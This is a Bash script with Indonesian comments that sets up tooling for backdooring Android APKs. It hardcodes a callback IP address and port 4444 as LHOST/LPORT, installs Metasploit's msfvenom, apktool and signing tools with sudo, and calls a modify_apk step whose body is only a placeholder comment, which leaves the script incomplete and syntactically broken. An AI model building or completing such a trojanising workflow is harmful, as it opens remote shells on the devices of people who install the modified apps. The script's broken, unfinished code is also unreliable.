#!/bin/bash

# =============================================
# APK MODIFIER WITH AUTO-AAPT2 INSTALLATION
# =============================================

# --- Konfigurasi ---
APK_INPUT="${1}"
LHOST="8.215.192.205"
LPORT="4444"
WORKDIR=$(mktemp -d)
TOOL_DIR="$HOME/.apk_tools"
LOG_FILE="apk_mod.log"

# --- Fungsi Instalasi AAPT2 ---
install_aapt2() {
    echo "[*] Memulai instalasi aapt2..." | tee -a "$LOG_FILE"
    
    # Cek apakah snap sudah terinstall
    if ! command -v snap &>/dev/null; then
        echo "[!] Snap tidak terinstall, menginstall snapd..." | tee -a "$LOG_FILE"
        sudo apt update && sudo apt install -y snapd 2>> "$LOG_FILE" || {
            echo "[X] Gagal menginstall snapd" | tee -a "$LOG_FILE"
            exit 1
        }
    fi

    # Install Android SDK via snap
    if ! snap list | grep -q androidsdk; then
        echo "[*] Menginstall Android SDK via snap..." | tee -a "$LOG_FILE"
        sudo snap install androidsdk --classic 2>> "$LOG_FILE" || {
            echo "[X] Gagal menginstall Android SDK" | tee -a "$LOG_FILE"
            exit 1
        }
    fi

    # Install build-tools
    echo "[*] Menginstall build-tools..." | tee -a "$LOG_FILE"
    androidsdk --install "build-tools 34.0.0" 2>> "$LOG_FILE" || {
        echo "[X] Gagal menginstall build-tools" | tee -a "$LOG_FILE"
        exit 1
    }

    # Tambahkan ke PATH
    echo 'export PATH=$PATH:/snap/bin' >> ~/.bashrc
    source ~/.bashrc

    # Verifikasi
    if ! command -v aapt2 &>/dev/null; then
        echo "[X] aapt2 masih tidak terdeteksi setelah instalasi" | tee -a "$LOG_FILE"
        exit 1
    fi
    
    echo "[√] aapt2 berhasil diinstall" | tee -a "$LOG_FILE"
}

# --- Fungsi Utama ---
check_dependencies() {
    local missing=()
    local required=("apktool" "jarsigner" "zipalign" "keytool" "msfvenom")
    
    for cmd in "${required[@]}"; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo "[!] Tool yang diperlukan: ${missing[*]}" | tee -a "$LOG_FILE"
        
        # Install MSFVenom jika belum ada
        if [[ " ${missing[*]} " =~ " msfvenom " ]]; then
            echo "[*] Menginstall Metasploit..." | tee -a "$LOG_FILE"
            sudo apt install -y metasploit-framework 2>> "$LOG_FILE"
        fi
    fi

    # Cek aapt2 khusus
    if ! command -v aapt2 &>/dev/null; then
        install_aapt2
    fi
}

modify_apk() {
    # [Implementasi proses modifikasi APK yang sama seperti sebelumnya]
    # ... tambahkan kode modifikasi APK di sini ...
}

# --- Eksekusi Utama ---
echo "=== APK MODIFIER ===" | tee -a "$LOG_FILE"
echo "LHOST: $LHOST" | tee -a "$LOG_FILE"
echo "LPORT: $LPORT" | tee -a "$LOG_FILE"

check_dependencies
modify_apk

echo "[+] Proses selesai!" | tee -a "$LOG_FILE"
